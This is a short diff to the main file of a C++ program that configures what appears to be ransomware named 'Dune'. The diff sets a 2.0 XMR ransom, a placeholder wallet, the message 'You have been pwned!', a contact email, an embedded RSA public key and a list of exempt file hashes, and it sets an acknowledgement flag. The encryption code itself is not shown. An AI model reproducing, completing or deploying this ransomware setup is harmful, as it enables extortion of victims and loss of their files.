@@ -1,15 +1,8 @@
 #include <iostream>
 #include <vector>
-#include <thread>
 #include <string>
 #include <chrono>
 #include "inc/dune.hpp"
-
-enum OP_MODE
-{
-    DUNE_SERVER,
-    DUNE_CLIENT
-};
 
 int main(int argc, char *argv[])
 {
@@ -23,7 +16,8 @@ int main(int argc, char *argv[])
                              "ND8Xa8c7d8il4AjK5QIDAQAB\n"
                              "-----END PUBLIC KEY-----\n";
     std::vector<std::string> exempt_files = std::vector<std::string>();
-    exempt_files.push_back("59bd06edd54ae4a1740b0e8595c7300fb2c9cdac");
+    exempt_files.push_back("8521b4c405542a10e732466cbe67fc4f1848c3de");
+    exempt_files.push_back("c9831e93135c07e60e86d0cea63a878cb512764f");
     dune::Dune dune = dune::Dune(2.0, "XMR", "your address here", "You have been pwned!", notes, "tech@anon.gov", public_key, exempt_files);
     dune::Acknowledgement ack;
     ack.are_you_sure_you_want_to_do_this = true;
